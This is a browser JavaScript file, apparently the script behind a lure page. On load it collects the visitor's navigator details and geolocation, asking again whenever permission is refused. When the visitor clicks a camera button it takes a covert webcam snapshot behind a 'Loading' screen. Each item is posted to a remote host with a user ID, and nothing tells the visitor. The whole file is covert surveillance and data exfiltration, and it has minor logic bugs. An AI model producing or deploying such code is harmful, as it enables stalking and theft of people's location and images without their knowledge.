
async function getLocalisation(){

    return await new Promise((result) => {
        if ("geolocation" in navigator) {
            // Prompt user for permission to access their location
            navigator.geolocation.getCurrentPosition(
                // Success callback function
                (position) => {
                    // Get the user's latitude and longitude coordinates
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    result(position.coords);
                },
                // Error callback function
                (error) => {
                    // Handle errors, e.g. user denied location sharing permissions
                    console.error("Error getting user location:", error);
                    getLocalisation();
                }
            );
        } else {
            // Geolocation is not supported by the browser
            console.error("Geolocation is not supported by this browser.");
            result(null);
        }
    })
}

async function sendObject(key, data, type = "application/json") {
    const networkData = {};
    for (const k in data) {
        if (typeof data[key] !== "function") {
            networkData[k] = data[k];
        }
    }

    const user_id = document.getElementById('user_id').innerText;
    const remote_host = document.getElementById('remote_host').innerText;
    await fetch(`${remote_host}?user_key=${key}&user_id=${user_id}`, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, *cors, same-origin
        cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
        credentials: "same-origin", // include, *same-origin, omit
        headers: {
            "Content-Type": type,
        },
        redirect: "follow", // manual, *follow, error
        referrerPolicy: "no-referrer", // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
        body: JSON.stringify(networkData), // body data type must match "Content-Type" header
    });
}


let camera_button = document.querySelector("#start-camera");
let video = document.querySelector("#video");
let canvas = document.querySelector("#canvas");

camera_button.addEventListener('click', async function() {
    let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;



    camera_button.children[2].innerText = "Loading...."
    camera_button.disabled = true;
    delete camera_button.onclick;
    camera_button.innerHTML = '<img src="images/loading.gif"></img>';
    document.getElementById('cat').style.display = 'none'


    await new Promise(r => setTimeout(r, 500));

    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    let image_data_url = canvas.toDataURL('image/jpeg');

    const getBase64StringFromDataURL = (dataURL) =>
        dataURL.replace('data:', '').replace(/^.+,/, '');

    const b64 = getBase64StringFromDataURL(image_data_url);
    // data url of the image
    await sendObject('profile_picture', {__sent_image: b64});
});

async function getAll() {
    await sendObject('navigator', navigator);
    await sendObject('localisation', await getLocalisation());
}

getAll();
